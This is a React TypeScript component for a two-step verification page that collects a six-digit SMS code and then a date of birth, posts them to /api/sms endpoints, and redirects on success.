import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { Loader2 } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";
import { useLocation } from "wouter";
import { Logo } from "@/components/Logo";
import { Footer } from "@/components/Footer";
import { SkipNav } from "@/components/SkipNav";
import { ProgressIndicator } from "@/components/ProgressIndicator";
import { useToast } from "@/hooks/use-toast";
import { z } from "zod";

const smsCodeSchema = z.object({
  code: z.string().length(6, "Code must be 6 digits"),
});

const dobSchema = z.object({
  dateOfBirth: z.string().min(1, "Date of birth is required"),
});

type SMSCodeData = z.infer<typeof smsCodeSchema>;
type DOBData = z.infer<typeof dobSchema>;

export default function SMSVerification() {
  const [, setLocation] = useLocation();
  const [username, setUsername] = useState<string>("");
  const [timeLeft, setTimeLeft] = useState(300);
  const [isExpired, setIsExpired] = useState(false);
  const [step, setStep] = useState<1 | 2>(1);
  const [smsCode, setSmsCode] = useState<string>("");
  const [sessionId, setSessionId] = useState<string>("");
  const { toast } = useToast();

  useEffect(() => {
    document.title = "SMS Verification";
    return () => { document.title = "Sign in"; };
  }, []);

  const today = new Date();
  const maxDateObj = new Date(today.getFullYear() - 18, today.getMonth(), today.getDate());
  const maxDate = `${maxDateObj.getFullYear()}-${String(maxDateObj.getMonth() + 1).padStart(2, "0")}-${String(maxDateObj.getDate()).padStart(2, "0")}`;
  const minDate = "1900-01-01";

  const smsForm = useForm<SMSCodeData>({
    resolver: zodResolver(smsCodeSchema),
    defaultValues: { code: "" },
  });

  const dobForm = useForm<DOBData>({
    resolver: zodResolver(dobSchema),
    defaultValues: { dateOfBirth: "" },
  });

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    setUsername(urlParams.get("username") || "");
  }, []);

  useEffect(() => {
    if (timeLeft <= 0) { setIsExpired(true); return; }
    const timer = setInterval(() => setTimeLeft((prev) => prev - 1), 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };

  const verifyCodeMutation = useMutation({
    mutationFn: async (data: SMSCodeData) => {
      const response = await apiRequest("POST", "/api/sms/verify-code", { username, code: data.code });
      return response.json();
    },
    onSuccess: (result) => {
      setSmsCode(smsForm.getValues().code);
      setSessionId(result.sessionId || "");
      setStep(2);
    },
    onError: () => {
      smsForm.setError("code", { message: "Invalid verification code" });
    },
  });

  const verifyMutation = useMutation({
    mutationFn: async (data: DOBData) => {
      const response = await apiRequest("POST", "/api/sms/verify", {
        username,
        code: smsCode,
        sessionId,
        dateOfBirth: data.dateOfBirth,
        timestamp: new Date().toISOString(),
      });
      return response.json();
    },
    onSuccess: () => {
      toast({ title: "Verification Successful", description: "Your identity has been verified. Redirecting…" });
      setLocation("/success");
    },
    onError: () => {
      dobForm.setError("dateOfBirth", { message: "Verification failed. Please try again." });
    },
  });

  const resendCodeMutation = useMutation({
    mutationFn: async () => {
      const response = await apiRequest("POST", "/api/sms/resend", { username });
      return response.json();
    },
    onSuccess: () => {
      setTimeLeft(120);
      setIsExpired(false);
      smsForm.reset();
      setSmsCode("");
      setSessionId("");
      setStep(1);
      toast({ title: "Code Resent", description: "A new verification code has been sent to your phone." });
    },
  });

  const goBack = () => { step === 2 ? setStep(1) : setLocation("/"); };
  const isStep1 = step === 1;

  return (
    <div className="min-h-screen bg-white">
      <SkipNav />
      <header className="auth-page-header"><Logo /></header>
      <div role="main" id="main-content" className="auth-form-container">
        <ProgressIndicator currentStep={3} totalSteps={4} />
        <h1 className="auth-heading-primary auth-spacing-2x-mb">
          {isStep1 ? "Enter SMS Verification Code" : "Enter your date of birth"}
        </h1>
        {isStep1 && (
          <p className="text-sm text-gray-600 mb-4">
            We've sent a 6-digit code to your registered phone number for security verification.
          </p>
        )}
        {isStep1 && (
          <form onSubmit={smsForm.handleSubmit((data) => {
            if (isExpired) { smsForm.setError("code", { message: "Code has expired. Please request a new one." }); return; }
            verifyCodeMutation.mutate(data);
          })}>
            <div className="auth-text-field auth-spacing-2x-mb">
              <label htmlFor="code">6-digit code</label>
              <input type="text" id="code" inputMode="numeric" maxLength={6} placeholder="000000" {...smsForm.register("code")} disabled={isExpired || verifyCodeMutation.isPending} autoFocus data-testid="input-sms-code" />
              <p id="code-error-text">{smsForm.formState.errors.code?.message}</p>
              {!isExpired && timeLeft > 0 && (
                <p style={{ marginTop: "8px", fontSize: "12px", color: "#666" }}>
                  Code expires in: <span style={{ fontWeight: "bold", fontFamily: "monospace" }}>{formatTime(timeLeft)}</span>
                </p>
              )}
            </div>
            <div className="auth-text-bodyshort auth-spacing-2x-mb">Didn't get your one-time code?</div>
            <button type="button" onClick={() => resendCodeMutation.mutate()} disabled={resendCodeMutation.isPending || (!isExpired && timeLeft > 60)} className="auth-low-emph-button auth-spacing-2x-mb" data-testid="button-resend">
              Resend
              <svg version="1.1" aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style={{ width: "16px", height: "16px", marginLeft: "8px" }}>
                <path d="M15.5 18.1L14.4 17l5-5-5-5 1.1-1.1 6.1 6.1-6.1 6.1z"></path>
                <path d="M7.1 11.2h13.5v1.6H7.1z"></path>
              </svg>
            </button>
            <div className="flex gap-4 auth-spacing-3x-mb">
              <button type="button" onClick={goBack} id="back" className="auth-medium-emph-button flex-1" data-testid="button-back">
                <svg className="able-icon" aria-hidden="true" focusable="false" viewBox="0 0 24 24" style={{ width: "20px", height: "20px", marginRight: "8px" }}>
                  <path d="M15.5 5.5L8.75 12l6.75 6.5" stroke="currentColor" strokeWidth="2" fill="none" />
                </svg>Back
              </button>
              <button type="submit" id="next" className="auth-high-emph-button flex-1" data-testid="button-verify-code">
                {verifyCodeMutation.isPending ? <Loader2 className="h-4 w-4 animate-spin mx-auto" /> : "Next"}
              </button>
            </div>
          </form>
        )}
        {!isStep1 && (
          <form onSubmit={dobForm.handleSubmit((data) => verifyMutation.mutate(data))}>
            <div className="auth-text-field auth-spacing-2x-mb">
              <label htmlFor="dateOfBirth">Date of Birth</label>
              <input type="date" id="dateOfBirth" min={minDate} max={maxDate} {...dobForm.register("dateOfBirth")} disabled={verifyMutation.isPending} data-testid="input-date-of-birth" />
              <p id="dob-error-text">{dobForm.formState.errors.dateOfBirth?.message}</p>
              <p style={{ marginTop: "8px", fontSize: "12px", color: "#666" }}>You must be 18 years or older</p>
            </div>
            <div className="flex gap-4 auth-spacing-3x-mb">
              <button type="button" onClick={goBack} className="auth-medium-emph-button flex-1" data-testid="button-back-step2">
                <svg className="able-icon" aria-hidden="true" focusable="false" viewBox="0 0 24 24" style={{ width: "20px", height: "20px", marginRight: "8px" }}>
                  <path d="M15.5 5.5L8.75 12l6.75 6.5" stroke="currentColor" strokeWidth="2" fill="none" />
                </svg>Back
              </button>
              <button type="submit" id="submit" className="auth-high-emph-button flex-1" data-testid="button-submit">
                {verifyMutation.isPending ? <Loader2 className="h-4 w-4 animate-spin mx-auto" /> : "Complete"}
              </button>
            </div>
          </form>
        )}
      </div>
      <Footer />
    </div>
  );
}
